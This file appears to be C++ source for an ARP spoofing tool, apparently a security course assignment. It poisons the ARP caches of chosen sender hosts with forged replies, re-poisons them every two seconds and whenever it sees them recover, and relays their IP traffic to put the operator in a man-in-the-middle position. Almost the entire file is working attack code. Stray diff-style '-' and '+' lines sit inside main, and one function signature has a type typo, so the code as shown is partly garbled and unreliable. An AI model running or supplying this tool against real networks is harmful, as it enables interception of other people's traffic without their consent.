#include <cstdio>
#include <cstdlib>
#include <vector>
#include <map>
#include <ctime>
#include <unistd.h>
#include <pcap.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <thread>
#include <chrono>
#include <cstring>
#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h"
#include "mac.h"

#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

struct Flow {
    Ip senderIp;
    Mac senderMac;
    Ip targetIp;
    Mac targetMac;
};

Ip getMyIp(const char* dev) {
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        exit(1);
    }
    std::memset(&ifr, 0, sizeof(ifr));
    std::strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
    ifr.ifr_addr.sa_family = AF_INET;

    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) {
        perror("ioctl(SIOCGIFADDR)");
        close(sock);
        exit(1);
    }
    close(sock);

    auto* sin = reinterpret_cast<struct sockaddr_in*>(&ifr.ifr_addr);
    return Ip(ntohl(sin->sin_addr.s_addr));
}

Mac getMyMac(const char* dev) {
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return Mac::nullMac();
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        close(sock);
        return Mac::nullMac();
    }
    close(sock);
    return Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
}

Mac getMacByArp(pcap_t* handle, Mac myMac,IP myIp, Ip ip) {
    EthArpPacket packet;
    packet.eth_.dmac_ = Mac::broadcastMac();
    packet.eth_.smac_ = myMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_  = htons(ArpHdr::Request);
    packet.arp_.smac_ = myMac;
    packet.arp_.sip_ = htonl(Ip(myIp.toHostOrder()));
    packet.arp_.tmac_ = Mac::nullMac();
    packet.arp_.tip_ = htonl(ip);

    pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(packet));

    time_t start = time(nullptr);
    while (true) {
        if (time(nullptr) - start > 5) return Mac::nullMac();

        struct pcap_pkthdr* header;
        const u_char* recv;
        int res = pcap_next_ex(handle, &header, &recv);
        if (res <= 0) continue;

        auto* rep = (EthArpPacket*)recv;
        if (ntohs(rep->eth_.type_) != EthHdr::Arp) continue;
        if (ntohs(rep->arp_.op_) != ArpHdr::Reply) continue;
        if (ntohl(rep->arp_.sip_) != ip) continue;

        return rep->arp_.smac_;
    }
}

void sendArpInfect(pcap_t* handle, Mac myMac, const Flow& flow) {
    EthArpPacket packet;
    packet.eth_.dmac_ = flow.senderMac;
    packet.eth_.smac_ = myMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_  = htons(ArpHdr::Reply);
    packet.arp_.smac_ = myMac;
    packet.arp_.sip_ = htonl(flow.targetIp);
    packet.arp_.tmac_ = flow.senderMac;
    packet.arp_.tip_ = htonl(flow.senderIp);

    pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(packet));
}

bool detectRecover(const u_char* packet, const Flow& flow) {
    auto* eth = (EthHdr*)packet;
    if (eth->type() != EthHdr::Arp) return false;
    auto* arp = (ArpHdr*)(packet + sizeof(EthHdr));

    bool isRequest = (arp->op() == ArpHdr::Request) &&
                     (arp->sip() == flow.senderIp) &&
                     (arp->tip() == flow.targetIp);
    bool isReply   = (arp->op() == ArpHdr::Reply) &&
                   (arp->sip() == flow.targetIp) &&
                   (arp->tip() == flow.senderIp);
    return isRequest || isReply;
}

void relayIpPacket(pcap_t* handle, const u_char* packet, int len, const Flow& flow, Mac myMac) {
    auto* eth = (EthHdr*)packet;
    if (eth->type() != EthHdr::Ip4) return;
    if (!(eth->smac() == flow.senderMac && eth->dmac() == myMac)) return;

    u_char* relay = new u_char[len];
    memcpy(relay, packet, len);
    auto* rEth = (EthHdr*)relay;
    rEth->smac_ = myMac;
    rEth->dmac_ = flow.targetMac;

    pcap_sendpacket(handle, relay, len);
    delete[] relay;
}

//     ARP 감염 상태를 유지한다.
void maintainInfection(pcap_t* handle, Mac myMac, const std::vector<Flow>& flows) {
    while (true) {
        for (const auto& f : flows) {
            sendArpInfect(handle, myMac, f);
        }
        std::this_thread::sleep_for(std::chrono::seconds(2));  // 2초마다 재전송
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc - 2) % 2 != 0) {
        printf("syntax: arp-spoof <interface> <sender ip 1> <target ip 1> [...]\n");
        return 1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (!handle) {
        fprintf(stderr, "pcap_open_live() failed: %s\n", errbuf);
        return 1;
    }

    Mac myMac = getMyMac(dev);
    if (myMac.isNull()) {
        fprintf(stderr, "[-] Failed to get attacker MAC address\n");
        return 1;
    }
    printf("[*] Attacker MAC: %s\n", std::string(myMac).c_str());

		Ip myIp = getMyIp(dev);
		    printf("[*] Attacker IP: %s\n", myIp.toString().c_str());

    std::map<Ip, Mac> arpTable;
    std::vector<Flow> flows;

        for (int i = 2; i < argc; i += 2) {
        Flow f;
        f.senderIp = Ip(argv[i]);
        f.targetIp = Ip(argv[i+1]);

-       arpTable[f.senderIp] = getMacByArp(handle, myMac, f.senderIp);
+       arpTable[f.senderIp] = getMacByArp(handle, myMac, myIp, f.senderIp);
-       arpTable[f.targetIp] = getMacByArp(handle, myMac, f.targetIp);
+       arpTable[f.targetIp] = getMacByArp(handle, myMac, myIp, f.targetIp);

        f.senderMac = arpTable[f.senderIp];
        f.targetMac = arpTable[f.targetIp];
        flows.push_back(f);
    }

    for (const auto& f : flows) {
        printf("[+] Infecting %s (MAC: %s) to redirect to %s\n",
               std::string(f.senderIp).c_str(),
               std::string(f.senderMac).c_str(),
               std::string(f.targetIp).c_str());
    }

    // 감염 유지용 스레드 실행
    std::thread t(maintainInfection, handle, myMac, std::cref(flows));
    t.detach();

    // 패킷 캡처 & 릴레이 & 복구 감지 시 즉시 재감염
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        for (const auto& flow : flows) {
            if (detectRecover(packet, flow)) {
                printf("[!] Detected ARP recovery for %s, reinfecting...\n",
                       std::string(flow.senderIp).c_str());
                sendArpInfect(handle, myMac, flow);
            }
            relayIpPacket(handle, packet, header->caplen, flow, myMac);
        }
    }

    pcap_close(handle);
    return 0;
}
